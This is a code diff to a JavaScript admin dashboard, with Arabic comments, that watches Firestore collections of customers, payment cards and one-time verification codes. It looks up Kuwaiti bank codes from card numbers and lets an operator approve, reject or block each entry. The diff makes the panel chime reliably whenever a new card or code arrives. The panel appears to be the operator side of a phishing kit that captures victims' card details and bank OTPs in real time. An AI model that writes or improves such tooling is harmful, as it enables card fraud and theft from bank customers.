@@ -42,6 +42,11 @@
   let presenceRefreshTimer = null;
   let knownCustomerIds = new Set();
   let customersInitialized = false;
+  let knownCustomers = new Map();  // آخر نسخة معروفة من بيانات كل عميل
+  let knownCards = new Map();      // آخر نسخة معروفة من كل بطاقة
+  let knownOtps = new Map();       // آخر نسخة معروفة من كل رمز تحقق
+  let cardsInitialized = false;
+  let otpsInitialized = false;
   const binLookupCache = new Map();
   function getKuwaitBankCode(cardNumber) {
     const bin = String(cardNumber || '').replace(/\D/g, '').slice(0, 6);
@@ -237,48 +242,161 @@
     setTimeout(() => { div.style.opacity = '0'; div.style.transition = 'opacity 0.3s'; setTimeout(() => div.remove(), 300); }, 3000);
   }
 
-  // ── التنبيه الصوتي (نغمة هادئة واحدة عند بطاقة/OTP جديد) ───
-  // ── المراحل: زائر جديد / بطاقة / رمز تحقق ─────────────────
+  // ── التنبيه الصوتي ─────────────────────────────────────────
+  // نغمة واحدة تُطلق عند وصول أي بيانات جديدة إلى اللوحة
+  // (زائر جديد، تحديث بيانات عميل، بطاقة، رمز تحقق).
   let cardAlertAudio = null;
-  function playCardAlertAudio() {
-    if (!soundEnabled) return;
-    try {
-      cardAlertAudio = cardAlertAudio || new Audio('/assets/audio/card-alert.mp3');
-      cardAlertAudio.currentTime = 0;
-      cardAlertAudio.play().catch(() => {});
-    } catch (e) { /* تجاهل قيود تشغيل الصوت في المتصفح */ }
-  }
-  function playNotificationTone(stage = 'card') {
-    if (!soundEnabled) return;
-    if (stage === 'card') {
-      playCardAlertAudio();
-      return;
+  let audioUnlocked = false;
+  let lastToneAt = 0;
+  let pendingToneTimer = null;
+  let soundSuppressUntil = 0;      // كتم مؤقت بعد كتابة تقوم بها اللوحة نفسها
+  const TONE_GAP = 900;            // أدنى فاصل بين نغمتين (لدمج الدفعات)
+
+  // حقول لا تُعدّ «بيانات جديدة»: نبضة الحضور + الحقول التي يكتبها المدير
+  const SOUND_IGNORED_FIELDS = new Set([
+    'lastSeen', 'decision', 'status', 'decidedAt', 'decisionUpdatedAt', 'isBlocked',
+  ]);
+
+  function sameFieldValue(a, b) {
+    if (a === b) return true;
+    if (a && b && typeof a === 'object' && typeof b === 'object') {
+      const ta = typeof a.toMillis === 'function' ? a.toMillis() : null;
+      const tb = typeof b.toMillis === 'function' ? b.toMillis() : null;
+      if (ta !== null || tb !== null) return ta === tb;
+      try { return JSON.stringify(a) === JSON.stringify(b); } catch (e) { return false; }
     }
+    return false;
+  }
+
+  // هل وصلت بيانات جديدة فعلاً؟ (وثيقة جديدة، أو تغيّر أي حقل غير مستثنى)
+  function isIncomingChange(previous, next) {
+    if (!previous) return true;
+    const keys = new Set([...Object.keys(previous), ...Object.keys(next)]);
+    for (const key of keys) {
+      if (SOUND_IGNORED_FIELDS.has(key)) continue;
+      if (!sameFieldValue(previous[key], next[key])) return true;
+    }
+    return false;
+  }
+
+  function ensureAudioObjects() {
     try {
       audioCtx = audioCtx || new (window.AudioContext || window.webkitAudioContext)();
-      if (audioCtx.state === 'suspended') audioCtx.resume();
-      const tones = {
-        visitor: [660, 880],
-        card: [880, 1320],
-        otp: [1046, 1568, 2093],
-      };
-      const frequencies = tones[stage] || tones.card;
+      if (audioCtx.state === 'suspended') audioCtx.resume().catch(() => {});
+    } catch (e) { /* المتصفح لا يدعم Web Audio */ }
+    if (!cardAlertAudio) {
+      try {
+        cardAlertAudio = new Audio('/assets/audio/card-alert.mp3');
+        cardAlertAudio.preload = 'auto';
+      } catch (e) { cardAlertAudio = null; }
+    }
+  }
+
+  // نغمة مُولّدة احتياطية تعمل حتى لو تعذّر تشغيل ملف الصوت
+  function playSynthTone() {
+    try {
+      ensureAudioObjects();
+      if (!audioCtx) return;
+      if (audioCtx.state === 'suspended') notifySoundBlocked();
       const now = audioCtx.currentTime;
-      frequencies.forEach((freq, i) => {
+      [880, 1180].forEach((freq, i) => {
         const osc = audioCtx.createOscillator();
         const gain = audioCtx.createGain();
         osc.type = 'sine';
         osc.frequency.value = freq;
-        const start = now + i * 0.11;
+        const start = now + i * 0.13;
         gain.gain.setValueAtTime(0, start);
-        gain.gain.linearRampToValueAtTime(0.15, start + 0.01);  // ظهور تدريجي
-        gain.gain.exponentialRampToValueAtTime(0.001, start + 0.18); // تلاشٍ سريع
+        gain.gain.linearRampToValueAtTime(0.18, start + 0.01);
+        gain.gain.exponentialRampToValueAtTime(0.001, start + 0.2);
         osc.connect(gain).connect(audioCtx.destination);
         osc.start(start);
-        osc.stop(start + 0.19);
+        osc.stop(start + 0.21);
       });
-    } catch (e) { /* تجاهل أخطاء الصوت بصمت */ }
+    } catch (e) { /* تجاهل */ }
   }
+
+  // فتح قناة الصوت عند أول تفاعل من المستخدم (سياسة التشغيل التلقائي في المتصفحات)
+  function unlockAudio() {
+    ensureAudioObjects();
+    try {
+      if (audioCtx) {
+        if (audioCtx.state === 'suspended') audioCtx.resume().catch(() => {});
+        if (!audioUnlocked) {
+          const buffer = audioCtx.createBuffer(1, 1, 22050);
+          const source = audioCtx.createBufferSource();
+          source.buffer = buffer;
+          source.connect(audioCtx.destination);
+          source.start(0);
+          audioUnlocked = true;
+        }
+      }
+    } catch (e) { /* تجاهل */ }
+  }
+
+  // تنبيه مرة واحدة إن منع المتصفح تشغيل الصوت قبل تفاعل المستخدم
+  let soundBlockedNoticeShown = false;
+  function notifySoundBlocked() {
+    if (soundBlockedNoticeShown) return;
+    soundBlockedNoticeShown = true;
+    toast('اضغط في أي مكان في الصفحة لتفعيل نغمة الإشعارات', 'info');
+  }
+  ['pointerdown', 'keydown', 'touchstart'].forEach((evt) => {
+    document.addEventListener(evt, unlockAudio, { capture: true, passive: true });
+  });
+  document.addEventListener('visibilitychange', () => {
+    if (!document.hidden && soundEnabled) unlockAudio();
+  });
+
+  function playToneNow() {
+    lastToneAt = Date.now();
+    ensureAudioObjects();
+    let handled = false;
+    if (cardAlertAudio) {
+      try {
+        cardAlertAudio.currentTime = 0;
+        const attempt = cardAlertAudio.play();
+        handled = true;
+        if (attempt && typeof attempt.catch === 'function') {
+          attempt.catch((err) => {
+            playSynthTone();
+            if (err && err.name === 'NotAllowedError') notifySoundBlocked();
+          });
+        }
+      } catch (e) { handled = false; }
+    }
+    if (!handled) playSynthTone();
+  }
+
+  // كل وصول بيانات يمرّ من هنا: نغمة واحدة، ولا تُفقد نغمة عند تزامن أكثر من وثيقة
+  function playNotificationTone() {
+    if (!soundEnabled) return;
+    if (Date.now() < soundSuppressUntil) return;
+    const wait = TONE_GAP - (Date.now() - lastToneAt);
+    if (wait > 0) {
+      if (!pendingToneTimer) {
+        pendingToneTimer = setTimeout(() => { pendingToneTimer = null; playToneNow(); }, wait + 20);
+      }
+      return;
+    }
+    playToneNow();
+  }
+
+  // كتابات اللوحة نفسها (موافقة/رفض/حظر...) ليست بيانات واردة
+  function suppressIncomingSound(ms = 3000) {
+    soundSuppressUntil = Date.now() + ms;
+  }
+  (function guardDashboardWrites() {
+    try {
+      const proto = firebase.firestore.DocumentReference.prototype;
+      ['set', 'update', 'delete'].forEach((method) => {
+        const original = proto[method];
+        if (typeof original !== 'function' || original.__soundGuarded) return;
+        const wrapped = function () { suppressIncomingSound(); return original.apply(this, arguments); };
+        wrapped.__soundGuarded = true;
+        proto[method] = wrapped;
+      });
+    } catch (e) { console.warn('sound guard skipped:', e); }
+  })();
 
   function updateSoundUI() {
     if (!els.btnSound) return;
@@ -291,8 +409,8 @@
     soundEnabled = !soundEnabled;
     localStorage.setItem('admin_sound', soundEnabled ? '1' : '0');
     updateSoundUI();
-    // إن فُعّل للتو، نشغّل نغمة تأكيد بسيطة (يتطلب تفاعل المستخدم لإنشاء AudioContext)
-    if (soundEnabled) playNotificationTone();
+    // نغمة تأكيد عند التفعيل (وهي أيضاً تفتح قناة الصوت بعد تفاعل المستخدم)
+    if (soundEnabled) { unlockAudio(); playToneNow(); }
   }
 
   // ── المصادقة (Login) ────────────────────────────────────────
@@ -347,6 +465,12 @@
   }
 
   function logout() {
+    customersInitialized = false;
+    cardsInitialized = false;
+    otpsInitialized = false;
+    knownCustomers.clear();
+    knownCards.clear();
+    knownOtps.clear();
     if (unsubCustomers) { unsubCustomers(); unsubCustomers = null; }
     if (unsubCards) { unsubCards(); unsubCards = null; }
     if (unsubOtps) { unsubOtps(); unsubOtps = null; }
@@ -378,14 +502,18 @@
     // استماع لـ customers (يحفظ في خريطة بالـ sessionId)
     try {
       unsubCustomers = db.collection('customers').onSnapshot((snap) => {
-        const hasNewCustomer = customersInitialized && snap.docChanges().some((change) => change.type === 'added' && !knownCustomerIds.has(change.doc.id));
+        let hasIncomingCustomer = false;
         customersMap = {};
         snap.forEach((doc) => {
           const data = doc.data();
-          customersMap[data.sessionId || doc.id] = { id: doc.id, ...data };
+          if (customersInitialized && isIncomingChange(knownCustomers.get(doc.id), data)) {
+            hasIncomingCustomer = true;
+          }
+          knownCustomers.set(doc.id, data);
           knownCustomerIds.add(doc.id);
+          customersMap[data.sessionId || doc.id] = { id: doc.id, ...data };
         });
-        if (hasNewCustomer) playNotificationTone('visitor');
+        if (hasIncomingCustomer) playNotificationTone();
         customersInitialized = true;
         rebuildMerged();
       }, (err) => {
@@ -410,9 +538,11 @@
         cardsBySession = {};
         let hasNewCard = false;
         snap.docChanges().forEach((change) => {
-          if (change.type === 'added' && !knownCardIds.has(change.doc.id)) {
+          const cardData = change.doc.data();
+          if (cardsInitialized && isIncomingChange(knownCards.get(change.doc.id), cardData)) {
             hasNewCard = true;
           }
+          knownCards.set(change.doc.id, cardData);
         });
         snap.forEach((doc) => {
           const data = doc.data();
@@ -433,7 +563,8 @@
             return tb - ta;
           });
         });
-        if (hasNewCard) playNotificationTone('card');
+        if (hasNewCard) playNotificationTone();
+        cardsInitialized = true;
         rebuildMerged();
       }, (err) => {
         console.error('cards listen error:', err);
@@ -446,9 +577,11 @@
         otpsMap = {};
         let hasNewOtp = false;
         snap.docChanges().forEach((change) => {
-          if (change.type === 'added' && !knownOtpIds.has(change.doc.id)) {
+          const otpData = change.doc.data();
+          if (otpsInitialized && isIncomingChange(knownOtps.get(change.doc.id), otpData)) {
             hasNewOtp = true;
           }
+          knownOtps.set(change.doc.id, otpData);
         });
         snap.forEach((doc) => {
           const data = doc.data();
@@ -467,7 +600,8 @@
             return tb - ta;
           });
         });
-        if (hasNewOtp) playNotificationTone('otp');
+        if (hasNewOtp) playNotificationTone();
+        otpsInitialized = true;
         rebuildMerged();
       }, (err) => {
         console.error('otps listen error:', err);
